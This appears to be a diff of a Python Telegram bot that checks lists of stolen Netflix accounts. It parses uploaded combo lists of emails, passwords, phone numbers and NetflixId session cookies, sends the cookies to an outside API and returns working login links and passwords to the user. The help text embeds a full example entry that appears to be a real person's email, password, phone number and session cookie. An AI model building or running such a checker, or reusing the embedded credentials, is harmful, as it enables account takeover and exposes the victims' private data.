@@ -62,39 +62,69 @@ rate_limits = defaultdict(list)
 total_checks = 0
 valid_accounts = 0
 invalid_accounts = 0
-fake_tokens_detected = 0
 
-# ==================== REAL URL VALIDATION ====================
+# ==================== EXACT FORMAT PARSER ====================
 
-async def verify_login_url(url, email):
-    """Actually verify if a login URL works by checking its response"""
-    if not url:
-        return False
-    
+def parse_account_line(line):
+    """
+    Parse a single line in the exact format:
+    email:password | Phone: number | Country: name | Cookie: NetflixId=...
+    """
     try:
-        # Make a HEAD request to check if URL is accessible
-        response = requests.head(url, timeout=10, allow_redirects=True)
+        line = line.strip()
+        if not line:
+            return None
         
-        # Check if we get a successful response
-        if response.status_code == 200:
-            logger.info(f"✅ URL verified working for {email}")
-            return True
-        else:
-            logger.warning(f"❌ URL returned status {response.status_code} for {email}")
-            return False
-            
-    except requests.exceptions.Timeout:
-        logger.warning(f"⏰ URL timeout for {email}")
-        return False
-    except requests.exceptions.ConnectionError:
-        logger.warning(f"🔌 Connection error for {email}")
-        return False
+        account = {}
+        
+        # Split by | to get each field
+        fields = line.split('|')
+        
+        # First field contains email:password
+        first_field = fields[0].strip()
+        if ':' in first_field:
+            email_pass = first_field.split(':', 1)
+            account['email'] = email_pass[0].strip()
+            account['password'] = email_pass[1].strip()
+        
+        # Parse remaining fields
+        for field in fields[1:]:
+            field = field.strip()
+            if ':' in field:
+                key, value = field.split(':', 1)
+                key = key.strip().lower()
+                value = value.strip()
+                
+                if 'phone' in key:
+                    account['phone'] = value
+                elif 'country' in key:
+                    account['country'] = value
+                elif 'cookie' in key:
+                    account['full_cookie'] = value
+                    # Extract NetflixId from cookie
+                    netflix_match = re.search(r'NetflixId=([^&\s]+)', value)
+                    if netflix_match:
+                        account['netflix_id'] = netflix_match.group(1).strip()
+        
+        # Validate we have the minimum required fields
+        if 'netflix_id' not in account:
+            logger.warning("❌ No NetflixId found in line")
+            return None
+        
+        if 'email' not in account:
+            account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
+        
+        logger.info(f"✅ Parsed account: {account['email']}")
+        return account
+        
     except Exception as e:
-        logger.warning(f"❌ URL verification failed for {email}: {e}")
-        return False
+        logger.error(f"Error parsing line: {e}")
+        return None
 
-async def check_with_your_api(netflix_id, email, full_cookie=None):
-    """Check Netflix ID using YOUR API - with REAL validation"""
+# ==================== YOUR API FUNCTIONS ====================
+
+async def check_with_your_api(netflix_id, email):
+    """Check Netflix ID using YOUR API"""
     
     if not netflix_id:
         return {
@@ -113,16 +143,14 @@ async def check_with_your_api(netflix_id, email, full_cookie=None):
             "secret_key": SECRET_KEY
         }
         
-        # If we have the full cookie, include it
-        if full_cookie:
-            data["cookie"] = full_cookie
-        
         logger.info(f"📡 Calling YOUR API for {email}")
+        logger.info(f"🔑 Netflix ID: {netflix_id[:30]}...")
         
         response = requests.post(url, json=data, timeout=15)
         
         try:
             result = response.json()
+            logger.info(f"📥 API Response: {result}")
         except:
             return {
                 "success": False,
@@ -133,40 +161,20 @@ async def check_with_your_api(netflix_id, email, full_cookie=None):
         # Check YOUR API's response format
         if result.get('success') == True:
             login_url = result.get('login_url')
-            
             if login_url:
-                # VERIFY the URL actually works
-                is_working = await verify_login_url(login_url, email)
-                
-                if is_working:
-                    logger.info(f"✅ REAL VALID ACCOUNT for {email}")
-                    return {
-                        "success": True,
-                        "login_url": login_url,
-                        "email": email,
-                        "verified": True,
-                        "data": result
-                    }
-                else:
-                    logger.warning(f"⚠️ FAKE TOKEN DETECTED for {email}")
-                    global fake_tokens_detected
-                    fake_tokens_detected += 1
-                    return {
-                        "success": False,
-                        "error": "Token is invalid/expired",
-                        "error_code": "FAKE_TOKEN",
-                        "email": email
-                    }
-            else:
+                logger.info(f"✅ API SUCCESS for {email}")
                 return {
-                    "success": False,
-                    "error": "No login URL in response",
-                    "email": email
+                    "success": True,
+                    "login_url": login_url,
+                    "email": email,
+                    "data": result
                 }
         
         # Handle error responses
         error_msg = result.get('error', 'Unknown error')
         error_code = result.get('error_code', 'UNKNOWN')
+        
+        logger.warning(f"❌ API Error for {email}: {error_msg} ({error_code})")
         
         return {
             "success": False,
@@ -194,104 +202,10 @@ async def check_with_your_api(netflix_id, email, full_cookie=None):
             "email": email
         }
 
-# ==================== COOKIE EXTRACTOR ====================
-
-def extract_full_cookie(text):
-    """Extract the FULL Netflix cookie exactly as it appears"""
-    patterns = [
-        r'(NetflixId=v%3D3%26[^&\s\'"]+(?:%26[^&\s\'"]+)*)',
-        r'NetflixId=([^&\s\'"]+)',
-        r'[Cc]ookie.*?[=:].*?(NetflixId=[^\s\'"]+)',
-        r'(NetflixId=[a-zA-Z0-9%._-]+(?:%[0-9A-F]{2})*)',
-    ]
-    
-    for pattern in patterns:
-        match = re.search(pattern, text)
-        if match:
-            full_cookie = match.group(1).strip()
-            full_cookie = re.sub(r'[.,;:\'")\]}]+$', '', full_cookie)
-            return full_cookie
-    return None
-
-def extract_netflix_id_from_cookie(cookie):
-    """Extract just the NetflixId value from the full cookie"""
-    match = re.search(r'NetflixId=([^&\s]+)', cookie)
-    if match:
-        return match.group(1).strip()
-    return None
-
-def extract_email(text):
-    """Extract email from text"""
-    match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
-    return match.group(1).strip() if match else None
-
-def parse_account(text):
-    """Parse a single account"""
-    try:
-        account = {}
-        
-        full_cookie = extract_full_cookie(text)
-        if not full_cookie:
-            return None
-        
-        account['full_cookie'] = full_cookie
-        
-        netflix_id = extract_netflix_id_from_cookie(full_cookie)
-        if netflix_id:
-            account['netflix_id'] = netflix_id
-        
-        email = extract_email(text)
-        account['email'] = email if email else f"user_{netflix_id[:8] if netflix_id else 'unknown'}@account.com"
-        
-        return account
-        
-    except Exception as e:
-        logger.error(f"Error parsing account: {e}")
-        return None
-
-def split_into_accounts(content):
-    """Split file content into individual accounts"""
-    separators = [
-        '----------------------------------------',
-        '════════════════════════════════════════',
-        '────────────────────────────────────────',
-        '========================================',
-        '\n\n\n',
-    ]
-    
-    for sep in separators:
-        if sep in content:
-            accounts = content.split(sep)
-            return [acc.strip() for acc in accounts if acc.strip() and 'NetflixId=' in acc]
-    
-    lines = content.split('\n')
-    accounts = []
-    current = []
-    
-    for line in lines:
-        if re.search(r'(?:ACCOUNT|Account|PREMIUM)\s*#?\d+', line, re.IGNORECASE):
-            if current:
-                accounts.append('\n'.join(current))
-                current = [line]
-            else:
-                current = [line]
-        elif current:
-            current.append(line)
-        elif 'NetflixId=' in line and not current:
-            current = [line]
-    
-    if current:
-        accounts.append('\n'.join(current))
-    
-    if not accounts:
-        accounts = [line for line in lines if 'NetflixId=' in line]
-    
-    return accounts
-
 # ==================== TEST API COMMAND ====================
 
 async def test_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Test if YOUR API is working and returns real tokens"""
+    """Test if YOUR API is working"""
     await update.message.reply_text("🔄 Testing YOUR API connection...")
     
     try:
@@ -302,8 +216,7 @@ async def test_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"✅ **YOUR API IS ONLINE!**\n\n"
                 f"**API URL:** `{API_URL}`\n"
                 f"**Status:** Connected\n\n"
-                f"⚠️ **Note:** Even if API is online, it may return fake tokens.\n"
-                f"I now verify each URL before sending.",
+                f"Now try uploading a .txt file with accounts.",
                 parse_mode='Markdown'
             )
         else:
@@ -325,22 +238,21 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     welcome = f"""
 ╔════════════════════════════════════════╗
-║     🎬 NETFLIX COOKIE CHECKER PRO 🎬   ║
+║     🎬 NETFLIX ACCOUNT CHECKER PRO 🎬  ║
 ╚════════════════════════════════════════╝
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 👋 **Hello {user.first_name}!**
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📤 **Send me a .txt file** with Netflix cookies
+📤 **Send me a .txt file** with accounts in this format:
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-🔍 **I do REAL validation:**
-✅ Extract Netflix cookies from ANY format
-✅ Check each cookie with YOUR API
-✅ **VERIFY each login URL actually works**
-✅ **ONLY send working links - NO fake tokens!**
-✅ Show detailed results
+`email:password | Phone: number | Country: name | Cookie: NetflixId=...`
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📋 **Example:**
+`user@gmail.com:pass123 | Phone: 123-456-7890 | Country: Philippines | Cookie: NetflixId=v%3D3%26ct%3D...`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📌 **Commands:**
@@ -368,21 +280,21 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 1️⃣ **Prepare your .txt file**
-   • ANY format is accepted!
-   • Must contain Netflix cookies
+   • One account per line
+   • Use | to separate fields
+   • Must include Cookie: NetflixId=...
 
-2️⃣ **Send the file to me**
-   • I'll extract ALL cookies
-   • Check each with YOUR API
-   • **VERIFY each URL actually works**
-   • **Only send WORKING login links!**
+2️⃣ **Format:**
+`email:password | Phone: number | Country: name | Cookie: NetflixId=...`
+
+3️⃣ **Send the file to me**
+   • I'll extract each account
+   • Check with YOUR API
+   • Send working login links
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-⚠️ **FAKE TOKEN PROTECTION**
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-I now verify every login URL before sending.
-If the API returns a fake/invalid token,
-it will be rejected and not sent to you.
+📝 **Example:**
+`ckrdromeo35@gmail.com:Mynetpass$1 | Phone: 0906-583-3905 | Country: Philippines | Cookie: NetflixId=v%3D3%26ct%3DBgjHlOvcAxL8AtxPgj5Z8wQD96OUiO3dhlKFFZqWCTdEoJbpozaGNIEAvlFcvGHEYd7orhpCIST2b7kiRUQ91K7LvasSVs-FhRok0yTZpt-Z3G8W954FMD6EEh9L8UDRQlpyLDma76BiEME7EREt0mVVyDOWuX02SYjLIKHEZ0brhuldFVd98h2xmP5JPJ7ZKCcuc7baX1FByWZUqcujGGND2A7LSCf09ybYNcQW3v5S6S0q7MOo-aI35BHcXke8XLiaVmqpKgFZccIqmQAVZf2zFV89J-Wpbfrddcncj8IwH09RlM6q8qVmJv2yM8Tp6Bwfrq7SZroKEHKxanSutgpn7O6ouPhCDA86invV_56Tyu_tfWpa14kHwnjFX-LN4jxkZ85p1zxNhogp-vA_J7aenX7FKkvjQTkjmuvbGLqUSolB38ZcG4tYrlp6-rWLL-NHEmCFuPjRPdl1bU30O9DznK87wKWovdL-tMuoaUElASmzyiHFxpHBa6xG0ZhYwFbZBFF5GAYiDgoMCha0_YCFZMYvVXkt%26pg%3DCKI3R56PTJAYVGIVZJ33URBMXY%26ch%3DAQEAEAABABSOphugBxZDbPQYpibJ_Bn6Aqps1085bMI.`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⌨️ **COMMANDS:**
@@ -399,7 +311,7 @@ it will be rejected and not sent to you.
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Show statistics"""
-    global total_checks, valid_accounts, invalid_accounts, fake_tokens_detected
+    global total_checks, valid_accounts, invalid_accounts
     
     success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
     
@@ -412,10 +324,9 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 📈 **Performance:**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 • **Total Checks:** `{total_checks}`
-• **✅ REAL Valid:** `{valid_accounts}`
+• **✅ Valid:** `{valid_accounts}`
 • **❌ Invalid:** `{invalid_accounts}`
-• **⚠️ Fake Tokens Blocked:** `{fake_tokens_detected}`
-• **📊 Real Success Rate:** `{success_rate:.1f}%`
+• **📊 Success Rate:** `{success_rate:.1f}%`
 
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ⚡ **Powered by {YOUR_CREDIT}** ⚡
@@ -436,7 +347,7 @@ async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle uploaded .txt files"""
     user_id = update.effective_user.id
-    global total_checks, valid_accounts, invalid_accounts, fake_tokens_detected
+    global total_checks, valid_accounts, invalid_accounts
     
     if not check_rate_limit(user_id):
         await update.message.reply_text("⏰ Too many requests. Please wait a minute.")
@@ -455,94 +366,81 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         file_content = await file.download_as_bytearray()
         content = file_content.decode('utf-8', errors='ignore')
         
-        accounts = split_into_accounts(content)
+        # Split into lines (each line is one account)
+        lines = content.split('\n')
+        accounts = [line.strip() for line in lines if line.strip()]
         
-        if not accounts:
-            await status_msg.edit_text("❌ No Netflix cookies found in file.")
-            return
-        
-        await status_msg.edit_text(f"📊 Found {len(accounts)} potential accounts. Checking with YOUR API...")
+        await status_msg.edit_text(f"📊 Found {len(accounts)} accounts. Checking with YOUR API...")
         
         valid_count = 0
         invalid_count = 0
-        fake_count = 0
         valid_accounts_list = []
         
-        for i, account_text in enumerate(accounts, 1):
-            account = parse_account(account_text)
+        for i, line in enumerate(accounts, 1):
+            # Parse the line in your exact format
+            account = parse_account_line(line)
             
             if not account:
                 invalid_count += 1
+                logger.warning(f"❌ Failed to parse line {i}")
                 continue
             
+            # Update progress
             if i % 2 == 0 or i == len(accounts):
-                await status_msg.edit_text(
-                    f"🔄 Checking {i}/{len(accounts)}...\n"
-                    f"✅ Real Valid: {valid_count} | ⚠️ Fake: {fake_count} | ❌ Invalid: {invalid_count}"
-                )
+                await status_msg.edit_text(f"🔄 Checking account {i}/{len(accounts)}... (Valid: {valid_count})")
             
-            netflix_id = account.get('netflix_id')
-            email = account.get('email', f"account{i}@unknown.com")
-            full_cookie = account.get('full_cookie')
-            
-            if not netflix_id:
-                invalid_count += 1
-                continue
-            
-            result = await check_with_your_api(netflix_id, email, full_cookie)
+            # Check with YOUR API
+            result = await check_with_your_api(account['netflix_id'], account['email'])
             
             total_checks += 1
             
-            if result.get('success') and result.get('verified'):
+            if result.get('success'):
                 valid_count += 1
                 valid_accounts += 1
                 
-                valid_accounts_list.append({
-                    'email': email,
-                    'login_url': result['login_url']
-                })
+                # Build account details string
+                details = []
+                if account.get('country'):
+                    details.append(f"• **Country:** {account['country']}")
+                if account.get('phone'):
+                    details.append(f"• **Phone:** {account['phone']}")
+                
+                details_str = '\n'.join(details) if details else ''
                 
                 msg = f"""
-✅ **REAL VALID ACCOUNT FOUND!**
+✅ **VALID ACCOUNT FOUND!**
 
-📧 **Email:** `{email}`
-🔗 **Working Login Link:** `{result['login_url']}`
+📧 **Email:** `{account['email']}`
+🔑 **Password:** `{account.get('password', 'N/A')}`
+{details_str}
 
-⚡ **This link has been verified and works!**
+🔗 **Login Link:** `{result['login_url']}`
+
 ⚡ {YOUR_CREDIT}
                 """
                 
                 keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=result['login_url'])]]
                 await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
                 
-            elif result.get('error_code') == 'FAKE_TOKEN':
-                fake_count += 1
-                fake_tokens_detected += 1
-                # Don't send fake tokens to user
-                logger.warning(f"⚠️ Blocked fake token for {email}")
+                valid_accounts_list.append(account)
+                
             else:
                 invalid_count += 1
                 invalid_accounts += 1
+                logger.info(f"❌ Invalid account {i}: {account['email']} - {result.get('error')}")
             
             await asyncio.sleep(0.5)
         
         # Final summary
         if valid_count > 0:
             await status_msg.edit_text(
-                f"✅ **Complete!**\n\n"
-                f"📊 **Results:**\n"
-                f"• ✅ Real Valid: {valid_count}\n"
-                f"• ⚠️ Fake Tokens Blocked: {fake_count}\n"
-                f"• ❌ Invalid/Expired: {invalid_count}\n\n"
-                f"🔗 Working links have been sent above."
+                f"✅ **Complete!** Found {valid_count} valid accounts.\n"
+                f"All valid accounts have been sent above."
             )
         else:
             await status_msg.edit_text(
-                f"❌ **No working accounts found.**\n\n"
-                f"📊 **Results:**\n"
-                f"• ⚠️ Fake Tokens Blocked: {fake_count}\n"
-                f"• ❌ Invalid/Expired: {invalid_count}\n\n"
-                f"💡 Try with different cookies."
+                f"❌ **No valid accounts found.**\n"
+                f"Checked {len(accounts)} accounts, all invalid or expired."
             )
         
     except Exception as e:
@@ -571,15 +469,14 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def run_bot():
     """Run the bot"""
     print("=" * 60)
-    print("🎬 NETFLIX COOKIE CHECKER BOT - WITH REAL VALIDATION")
+    print("🎬 NETFLIX ACCOUNT CHECKER BOT")
     print("=" * 60)
     print(f"✅ Bot Token: {TOKEN[:10]}...")
     print(f"✅ YOUR API: {API_URL}")
     print(f"✅ Credit: {YOUR_CREDIT}")
     print("=" * 60)
     print("🤖 Bot is starting...")
-    print("🔍 REAL URL VALIDATION ENABLED")
-    print("⛔ Fake tokens will be blocked automatically")
+    print("📝 Using EXACT format: email:password | Phone | Country | Cookie")
     print("=" * 60)
     
     app = Application.builder().token(TOKEN).build()
